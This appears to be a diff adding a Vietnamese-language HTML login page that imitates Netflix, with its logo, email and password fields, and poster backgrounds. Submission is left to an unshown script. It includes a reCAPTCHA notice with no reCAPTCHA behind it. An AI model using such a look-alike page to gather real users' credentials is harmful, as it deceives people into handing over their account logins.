@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Netflix - Đăng nhập</title>
+    <link rel="stylesheet" href="netflix-style.css">
+</head>
+<body>
+    <div class="login-container">
+        <!-- Netflix Logo -->
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix" class="netflix-logo">
+        </div>
+
+        <!-- Login Form -->
+        <div class="login-form-container">
+            <form class="login-form" id="loginForm">
+                <h1>Đăng nhập</h1>
+                
+                <div class="form-group">
+                    <input type="email" id="email" placeholder="Email hoặc số điện thoại" required>
+                    <label for="email">Email hoặc số điện thoại</label>
+                </div>
+                
+                <div class="form-group">
+                    <input type="password" id="password" placeholder="Mật khẩu" required>
+                    <label for="password">Mật khẩu</label>
+                </div>
+                
+                <button type="submit" class="login-btn">Đăng nhập</button>
+                
+                <div class="form-options">
+                    <label class="checkbox-container">
+                        <input type="checkbox" id="remember">
+                        <span class="checkmark"></span>
+                        Ghi nhớ đăng nhập
+                    </label>
+                    <a href="#" class="forgot-password">Quên mật khẩu?</a>
+                </div>
+                
+                <div class="signup-link">
+                    <p>Chưa có tài khoản? <a href="signup.html">Đăng ký ngay</a></p>
+                </div>
+                
+                <div class="security-notice">
+                    <p>Trang này được bảo vệ bởi Google reCAPTCHA để đảm bảo bạn không phải là bot. <a href="#">Tìm hiểu thêm</a></p>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <!-- Background Images -->
+    <div class="background-overlay"></div>
+    <div class="background-images">
+        <div class="movie-poster" style="background-image: url('https://images.unsplash.com/photo-1489599537393-0e374d85d308?w=300&h=450&fit=crop')"></div>
+        <div class="movie-poster" style="background-image: url('https://images.unsplash.com/photo-1594736797933-d0c29d1b1a24?w=300&h=450&fit=crop')"></div>
+        <div class="movie-poster" style="background-image: url('https://images.unsplash.com/photo-1585647347384-2593bc35786b?w=300&h=450&fit=crop')"></div>
+        <div class="movie-poster" style="background-image: url('https://images.unsplash.com/photo-1578662996442-48f60103fc96?w=300&h=450&fit=crop')"></div>
+        <div class="movie-poster" style="background-image: url('https://images.unsplash.com/photo-1551698618-1dfe5d97d256?w=300&h=450&fit=crop')"></div>
+        <div class="movie-poster" style="background-image: url('https://images.unsplash.com/photo-1512149177596-f817c7ef5d4c?w=300&h=450&fit=crop')"></div>
+        <div class="movie-poster" style="background-image: url('https://images.unsplash.com/photo-1574375927938-d5a98e8ffe85?w=300&h=450&fit=crop')"></div>
+        <div class="movie-poster" style="background-image: url('https://images.unsplash.com/photo-1574269909862-7e1d70bb8078?w=300&h=450&fit=crop')"></div>
+        <div class="movie-poster" style="background-image: url('https://images.unsplash.com/photo-1594736797933-d0c29d1b1a24?w=300&h=450&fit=crop')"></div>
+        <div class="movie-poster" style="background-image: url('https://images.unsplash.com/photo-1578662996442-48f60103fc96?w=300&h=450&fit=crop')"></div>
+        <div class="movie-poster" style="background-image: url('https://images.unsplash.com/photo-1585647347384-2593bc35786b?w=300&h=450&fit=crop')"></div>
+        <div class="movie-poster" style="background-image: url('https://images.unsplash.com/photo-1551698618-1dfe5d97d256?w=300&h=450&fit=crop')"></div>
+    </div>
+
+    <script src="netflix-script.js"></script>
+</body>
+</html>
